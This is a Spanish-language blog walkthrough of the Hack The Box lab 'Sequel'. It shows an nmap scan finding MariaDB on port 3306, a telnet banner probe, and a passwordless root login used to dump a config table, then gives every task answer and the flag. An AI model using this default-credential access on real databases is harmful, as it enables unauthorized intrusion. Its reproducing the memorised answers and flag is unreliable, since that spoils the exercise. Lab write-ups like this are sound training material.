---
title: "Sequel"
date: 2022-05-14T23:01:02-05:00
draft: false

description: "Resolución del reto Sequel de Hack the box"
hideToc: false #(false: se muestra el indice a la derecha ... true no se muestra)
enableToc: true #(Se quita o no la opci贸n de derecha que permite ocultar o no)
enableTocContent: false  #(Indice pero vertical)
author: Brayan Rodriguez #(Autor)
authorEmoji: 👺

#(Etiquetas de referencia al contenido)
tags:
- Weak-password
- Fundamentos

categories:
- Ciberseguridad
- Hack-the-box
image: images/HTB/02_Sequel/Sequel.png
---

### TASK 1 What does the acronym SQL stand for?

ANS: structured query language

### TASK 2 During our scan, which port running mysql do we find?

Se realiza una escaneo con nmap y se detecta el puerto 3306 tcp abierto 

{{< highlight Bash >}}

Nmap scan report for 10.129.30.80
Host is up (0.78s latency).
Not shown: 999 closed tcp ports (conn-refused)
PORT     STATE SERVICE
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 55.11 seconds

{{< /highlight >}} 	

ANS 3306 

### TASK 3 What community-developed MySQL version is the target running?

Nos conectamos por telnet al host en el puerto 3306. Se fuerza un error y se detecta el uso de la tecnología MariaDB

{{< highlight Bash >}}

└─$ telnet $IP 3306
Trying 10.129.119.102...
Connected to 10.129.119.102.
Escape character is '^]'.
help
ls
who
select * from all;
c
5.5.5-10.3.27-MariaDB-0+deb10u1IqQ}Dz\>`��-��I+;&K*,?8:\>mysql_native_password!#08S01Got packets out of orderConnection closed by foreign host.

{{< /highlight >}} 	

ANS MariaDB

Se realiza una búsqueda en internet de potenciales credenciales débiles y probamos un usuario conocido ***root*** con contraseña ***vacía***

{{< highlight Bash >}}

─$ mysql -u root -p -h $IP        
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 76
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
4 rows in set (0.193 sec)

MariaDB [(none)]> use htb;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [htb]> show tables;
+---------------+
| Tables_in_htb |
+---------------+
| config        |
| users         |
+---------------+
2 rows in set (0.195 sec)

MariaDB [htb]> select * from config;
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
7 rows in set (0.192 sec)

MariaDB [htb]> 

{{< /highlight >}} 	

### TASK 4 What switch do we need to use in order to specify a login username for the MySQL service?

ANS: -u

### TASK 5 Which username allows us to log into MariaDB without providing a password?

ANS: root 

### TASK 6 What symbol can we use to specify within the query that we want to display everything inside a table?

ANS:  *

### TASK 7 What symbol do we need to end each query with?

ANS:  ;

### SUBMIT FLAG

Como se observó en la tarea 3, se logró obtener el flag que se encontraba en la tabla ***config***

ANS: 7b4bec00d1a39e3dd4e021ec3d915da8

Notas:

https://www.mysqltutorial.org/mysql-cheat-sheet.aspx